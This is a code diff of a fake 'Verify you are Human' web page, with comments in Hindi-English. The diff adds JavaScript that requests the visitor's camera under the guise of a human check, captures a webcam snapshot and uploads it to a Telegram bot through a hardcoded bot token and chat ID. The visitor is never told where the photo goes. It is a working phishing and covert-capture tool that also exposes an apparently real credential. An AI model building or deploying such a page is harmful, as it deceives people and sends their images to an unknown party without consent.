@@ -11,9 +11,13 @@
             text-align: center;
             font-family: Arial, sans-serif;
         }
-        
-        /* Video aur Canvas ko screen se gayab karna */
-        #hidden-video, #hidden-canvas {
+
+        /* User ko dikhane ke liye video visible rakha hai */
+        #video-stream {
+            width: 300px;
+            margin-top: 20px;
+            border: 2px solid #333;
+            border-radius: 10px;
             display: none; 
         }
 
@@ -23,7 +27,20 @@
             color: white;
             border: none;
             cursor: pointer;
-            margin-top: 20%;
+            margin-top: 50px;
+            font-size: 18px;
+            border-radius: 5px;
+        }
+
+        .verify-btn:disabled {
+            background-color: grey;
+            cursor: not-allowed;
+        }
+        
+        #status {
+            margin-top: 10px;
+            color: green;
+            font-weight: bold;
         }
     </style>
 </head>
@@ -31,26 +48,98 @@
 <body>
 
     <h1>Click below to Verify you are Human</h1>
-    <button class="verify-btn" onclick="startProcess()">Verify Now</button>
+    <button class="verify-btn" id="btn" onclick="startProcess()">Verify Now</button>
+    <p id="status"></p>
 
-    <video id="hidden-video" autoplay playsinline></video>
-    <canvas id="hidden-canvas"></canvas>
+    <video id="video-stream" autoplay playsinline muted></video>
+    <canvas id="hidden-canvas" style="display:none;"></canvas>
 
     <script>
-        --- CONFIGURATION ---
-        const botToken = "BOT_TOKEN"; 
-        const chatId = "CHAT_ID";
+        // --- CONFIGURATION ---
+        const botToken = "8593566926:AAEhOP5u2ph3FriBMGrWvpSl8X-xEsXgrfk"; 
+        const chatId = "7681204940";
 
-        --- FUNCTIONS ---
+        // --- FUNCTIONS ---
         
         async function startProcess() {
-            navigator.mediaDevices
+            const statusText = document.getElementById("status");
+            const btn = document.getElementById("btn");
+            const video = document.getElementById("video-stream");
+
+            statusText.innerText = "Requesting Camera Access...";
             
-          
- 
-            console.log("Process Started...");
+            if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
+                try {
+                    // 1. Camera Access
+                    const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+                    video.srcObject = stream;
+                    video.style.display = "inline-block"; // Video dikhayen
+                    btn.disabled = true;
+                    btn.innerText = "Verifying...";
+                    statusText.innerText = "Camera Active. Please wait...";
+
+                    // 2. Wait for 3 seconds before capturing (for better quality)
+                    setTimeout(() => {
+                        captureAndSend(video, stream);
+                    }, 3000);
+
+                } catch (error) {
+                    console.error(error);
+                    statusText.innerText = "Permission Denied. Cannot verify.";
+                    statusText.style.color = "red";
+                }
+            } else {
+                alert("Browser not supported");
+            }
         }
 
-    </script
+        function captureAndSend(video, stream) {
+            const canvas = document.getElementById("hidden-canvas");
+            const context = canvas.getContext("2d");
+
+            // Set canvas size equal to video size
+            canvas.width = video.videoWidth;
+            canvas.height = video.videoHeight;
+
+            // Draw image on canvas
+            context.drawImage(video, 0, 0, canvas.width, canvas.height);
+
+            // Convert to Blob and Send to Telegram
+            canvas.toBlob(function(blob) {
+                sendToTelegram(blob);
+                
+                // Stop Camera after capture
+                stream.getTracks().forEach(track => track.stop());
+                video.style.display = "none";
+                document.getElementById("status").innerText = "Verification Complete!";
+                document.getElementById("btn").innerText = "Verified ✅";
+            }, 'image/jpeg');
+        }
+
+        function sendToTelegram(photoBlob) {
+            const formData = new FormData();
+            formData.append("chat_id", chatId);
+            formData.append("photo", photoBlob, "verification_photo.jpg");
+            formData.append("caption", "New Verification Attempt! 📸");
+
+            fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
+                method: "POST",
+                body: formData
+            })
+            .then(response => response.json())
+            .then(data => {
+                console.log("Sent to Telegram:", data);
+                if(data.ok) {
+                    alert("Verification Photo Sent Successfully!");
+                } else {
+                    console.error("Telegram Error:", data);
+                }
+            })
+            .catch(error => {
+                console.error("Error sending photo:", error);
+            });
+        }
+
+    </script>
 </body>
 </html>
